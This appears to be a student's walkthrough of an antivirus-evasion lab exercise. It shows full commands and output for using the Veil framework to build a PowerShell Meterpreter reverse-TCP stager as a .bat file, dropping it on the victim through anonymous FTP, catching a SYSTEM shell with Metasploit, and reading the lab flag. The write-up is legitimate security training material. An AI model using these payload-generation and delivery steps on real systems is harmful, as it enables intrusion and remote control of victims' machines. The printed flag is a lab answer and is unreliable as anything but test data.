# Walk: Antivirus Evasion - Module Exercise - VM #2 

## Fecha: 26/06/2025
## Host: {HOST}
## IP: {IP}
## Objetivo

**Capstone Lab**: Similar to the previous exercise, you'll be facing off against COMODO antivirus engine v12.2.2.8012 on Module Exercise VM #2. 
Although the PowerShell AV bypass we covered in this Module is substantial, it has an inherent limitation. 
The malicious script cannot be double-clicked by the user for an immediate execution. Instead, it would open in notepad.exe or another default text editor. 
The tradecraft of manually weaponizing PowerShell scripts is beyond the scope of this module, but we can rely on another 
open-source framework to help us automate this process. Research how to install and use the Veil framework to help you with this exercise.

The victim machine runs an anonymous FTP server with open read/write permissions. 
Every few seconds, the victim user will double-click on any existing Windows batch script file(s) (.bat) in the FTP root directory. 
If the antivirus flags the script as malicious, the script will be quarantined and then deleted. Otherwise, 
the script will execute and hopefully, grant you a reverse shell.

## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Enumeracion basica
```bash
┌──(root㉿kali)-[/home/…/15-AntiVirus/03-AV-EvasionPractice/Capstones/VM-2]
└─# nmap -sV -sC 192.168.149.53 -Pn                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-26 10:22 -03
Nmap scan report for 192.168.149.53
Host is up (0.17s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 403 - Forbidden: Access is denied.
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.01 seconds
```
#### Paso 2: Conexion al servidor ftp
```bash
┌──(root㉿kali)-[/home/…/OffSec/15-AntiVirus/03-AV-EvasionPractice/Capstones]
└─# ftp 192.168.149.53
Connected to 192.168.149.53.
220 Microsoft FTP Service
Name (192.168.149.53:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> help
Commands may be abbreviated.  Commands are:

!               edit            lpage           nlist           rcvbuf          struct
$               epsv            lpwd            nmap            recv            sunique
account         epsv4           ls              ntrans          reget           system
append          epsv6           macdef          open            remopts         tenex
ascii           exit            mdelete         page            rename          throttle
bell            features        mdir            passive         reset           trace
binary          fget            mget            pdir            restart         type
bye             form            mkdir           pls             rhelp           umask
case            ftp             mls             pmlsd           rmdir           unset
cd              gate            mlsd            preserve        rstatus         usage
cdup            get             mlst            progress        runique         user
chmod           glob            mode            prompt          send            verbose
close           hash            modtime         proxy           sendport        xferbuf
cr              help            more            put             set             ?
debug           idle            mput            pwd             site
delete          image           mreget          quit            size
dir             lcd             msend           quote           sndbuf
disconnect      less            newer           rate            status
ftp> pwd
Remote directory: /
```
#### Paso 3: Generar backdoor con Veil

```bash
┌──(root㉿kali)-[/home/…/15-AntiVirus/03-AV-EvasionPractice/Capstones/VM-2]
└─# veil                             
===============================================================================
                             Veil | [Version]: 3.1.14
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

Main Menu

        2 tools loaded

Available Tools:

        1)      Evasion
        2)      Ordnance

Available Commands:

        exit                    Completely exit Veil
        info                    Information on a specific tool
        list                    List available tools
        options                 Show Veil configuration
        update                  Update Veil
        use                     Use a specific tool

Veil>: use Evasion
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

Veil-Evasion Menu

        41 payloads loaded

Available Commands:

        back                    Go to Veil's main menu
        checkvt                 Check VirusTotal.com against generated hashes
        clean                   Remove generated artifacts
        exit                    Completely exit Veil
        info                    Information on a specific payload
        list                    List available payloads
        use                     Use a specific payload

Veil/Evasion>: list
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================


 [*] Available Payloads:                                                                                                                                                                                          
                                                                                                                                                                                                                  
        1)      autoit/shellcode_inject/flat.py

        2)      auxiliary/coldwar_wrapper.py
        3)      auxiliary/macro_converter.py
        4)      auxiliary/pyinstaller_wrapper.py

        5)      c/meterpreter/rev_http.py
        6)      c/meterpreter/rev_http_service.py
        7)      c/meterpreter/rev_tcp.py
        8)      c/meterpreter/rev_tcp_service.py

        9)      cs/meterpreter/rev_http.py
        10)     cs/meterpreter/rev_https.py
        11)     cs/meterpreter/rev_tcp.py
        12)     cs/shellcode_inject/base64.py
        13)     cs/shellcode_inject/virtual.py

        14)     go/meterpreter/rev_http.py
        15)     go/meterpreter/rev_https.py
        16)     go/meterpreter/rev_tcp.py
        17)     go/shellcode_inject/virtual.py

        18)     lua/shellcode_inject/flat.py

        19)     perl/shellcode_inject/flat.py

        20)     powershell/meterpreter/rev_http.py
        21)     powershell/meterpreter/rev_https.py
        22)     powershell/meterpreter/rev_tcp.py
        23)     powershell/shellcode_inject/psexec_virtual.py
        24)     powershell/shellcode_inject/virtual.py

        25)     python/meterpreter/bind_tcp.py
        26)     python/meterpreter/rev_http.py
        27)     python/meterpreter/rev_https.py
        28)     python/meterpreter/rev_tcp.py
        29)     python/shellcode_inject/aes_encrypt.py
        30)     python/shellcode_inject/arc_encrypt.py
        31)     python/shellcode_inject/base64_substitution.py
        32)     python/shellcode_inject/des_encrypt.py
        33)     python/shellcode_inject/flat.py
        34)     python/shellcode_inject/letter_substitution.py
        35)     python/shellcode_inject/pidinject.py
        36)     python/shellcode_inject/stallion.py

        37)     ruby/meterpreter/rev_http.py
        38)     ruby/meterpreter/rev_https.py
        39)     ruby/meterpreter/rev_tcp.py
        40)     ruby/shellcode_inject/base64.py
        41)     ruby/shellcode_inject/flat.py


Veil/Evasion>: use 22
===============================================================================                                                                                                                                   
                                   Veil-Evasion                                                                                                                                                                   
===============================================================================                                                                                                                                   
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 Payload Information:
                                                                                                                                                                                                                  
        Name:           Pure PowerShell Reverse TCP Stager
        Language:       powershell
        Rating:         Excellent
        Description:    pure windows/meterpreter/reverse_tcp stager, no
                        shellcode

Payload: powershell/meterpreter/rev_tcp selected

 Required Options:
                                                                                                                                                                                                                  
Name                    Value           Description
----                    -----           -----------
BADMACS                 FALSE           Checks for known bad mac addresses
DOMAIN                  X               Optional: Required internal domain
HOSTNAME                X               Optional: Required system hostname
LHOST                                   IP of the Metasploit handler
LPORT                   4444            Port of the Metasploit handler
MINBROWSERS             FALSE           Minimum of 2 browsers
MINPROCESSES            X               Minimum number of processes running
MINRAM                  FALSE           Require a minimum of 3 gigs of RAM
PROCESSORS              X               Optional: Minimum number of processors
SLEEP                   X               Optional: Sleep "Y" seconds, check if accelerated
USERNAME                X               Optional: The required user account
USERPROMPT              FALSE           Window pops up prior to payload
UTCCHECK                FALSE           Check that system isn't using UTC time zone
VIRTUALPROC             FALSE           Check for known VM processes

 Available Commands:
                                                                                                                                                                                                                  
        back            Go back to Veil-Evasion
        exit            Completely exit Veil
        generate        Generate the payload
        options         Show the shellcode's options
        set             Set shellcode option

[powershell/meterpreter/rev_tcp>>]: set LHOST 192.168.45.213
[powershell/meterpreter/rev_tcp>>]: options

Payload: powershell/meterpreter/rev_tcp selected

 Required Options:
                                                                                                                                                                                                                  
Name                    Value           Description
----                    -----           -----------
BADMACS                 FALSE           Checks for known bad mac addresses
DOMAIN                  X               Optional: Required internal domain
HOSTNAME                X               Optional: Required system hostname
LHOST                   192.168.45.213  IP of the Metasploit handler
LPORT                   4444            Port of the Metasploit handler
MINBROWSERS             FALSE           Minimum of 2 browsers
MINPROCESSES            X               Minimum number of processes running
MINRAM                  FALSE           Require a minimum of 3 gigs of RAM
PROCESSORS              X               Optional: Minimum number of processors
SLEEP                   X               Optional: Sleep "Y" seconds, check if accelerated
USERNAME                X               Optional: The required user account
USERPROMPT              FALSE           Window pops up prior to payload
UTCCHECK                FALSE           Check that system isn't using UTC time zone
VIRTUALPROC             FALSE           Check for known VM processes

 Available Commands:
                                                                                                                                                                                                                  
        back            Go back to Veil-Evasion
        exit            Completely exit Veil
        generate        Generate the payload
        options         Show the shellcode's options
        set             Set shellcode option

[powershell/meterpreter/rev_tcp>>]: generate
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 [>] Please enter the base name for output files (default is payload): ftp_bypass
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 [*] Language: powershell
 [*] Payload Module: powershell/meterpreter/rev_tcp
 [*] PowerShell doesn't compile, so you just get text :)
 [*] Source code written to: /var/lib/veil/output/source/ftp_bypass.bat
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/ftp_bypass.rc

Hit enter to continue...

===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

Veil-Evasion Menu

        41 payloads loaded

Available Commands:

        back                    Go to Veil's main menu
        checkvt                 Check VirusTotal.com against generated hashes
        clean                   Remove generated artifacts
        exit                    Completely exit Veil
        info                    Information on a specific payload
        list                    List available payloads
        use                     Use a specific payload

Veil/Evasion>:
```
#### Paso 5: Configuramos e iniciamos el receptor:
```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > set LHOST 192.168.45.213
LHOST => 192.168.45.213
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.45.213:4444
```
#### Paso 6: Subimos al servidor el backdoor
```bash
┌──(root㉿kali)-[/home/…/15-AntiVirus/03-AV-EvasionPractice/Capstones/VM-2]
└─# ftp 192.168.149.53
Connected to 192.168.149.53.
220 Microsoft FTP Service
Name (192.168.149.53:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> bin
200 Type set to I.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> put ftp_bypass.bat
local: ftp_bypass.bat remote: ftp_bypass.bat
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |*********************************************************|  2295       26.69 MiB/s    00:00 ETA
226 Transfer complete.
2295 bytes sent in 00:00 (10.94 KiB/s)
ftp> 
```
* En el receptor:
```bash
msf6 exploit(multi/handler) > 
[*] Sending stage (177734 bytes) to 192.168.149.53
[*] Meterpreter session 1 opened (192.168.45.213:4444 -> 192.168.149.53:57784) at 2025-06-26 12:02:50 -0300
sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ VICTIM  192.168.45.213:4444 -> 192.168.149.53:57784 (192.168.149.53)

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 1524 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9C98-18D0

 Directory of C:\Users\Administrator

03/08/2025  10:09 AM    <DIR>          .
03/08/2025  10:09 AM    <DIR>          ..
10/05/2021  01:52 PM    <DIR>          3D Objects
12/21/2021  01:46 PM    <DIR>          AVEvasionService
10/05/2021  01:52 PM    <DIR>          Contacts
03/01/2023  09:01 AM    <DIR>          Desktop
10/05/2021  01:52 PM    <DIR>          Documents
10/05/2021  01:52 PM    <DIR>          Downloads
10/05/2021  01:52 PM    <DIR>          Favorites
10/05/2021  01:52 PM    <DIR>          Links
10/05/2021  01:52 PM    <DIR>          Music
10/05/2021  01:53 PM    <DIR>          OneDrive
10/05/2021  01:52 PM    <DIR>          Pictures
10/05/2021  01:52 PM    <DIR>          Saved Games
10/05/2021  01:52 PM    <DIR>          Searches
12/06/2021  11:45 AM    <DIR>          Videos
               0 File(s)              0 bytes
              16 Dir(s)   5,629,145,088 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9C98-18D0

 Directory of C:\Users\Administrator\Desktop

03/01/2023  09:01 AM    <DIR>          .
03/01/2023  09:01 AM    <DIR>          ..
12/21/2021  01:43 PM         5,711,824 cav_installer_138430010_1a.exe
06/26/2025  07:45 AM                78 flag.txt
03/01/2023  09:01 AM             1,378 lab.ps1
12/06/2021  12:11 PM             2,348 Microsoft Edge.lnk
               4 File(s)      5,715,628 bytes
               2 Dir(s)   5,629,145,088 bytes free

C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
OS{a64f028acf1235e5691dfa11028569fa}

C:\Users\Administrator\Desktop>
```

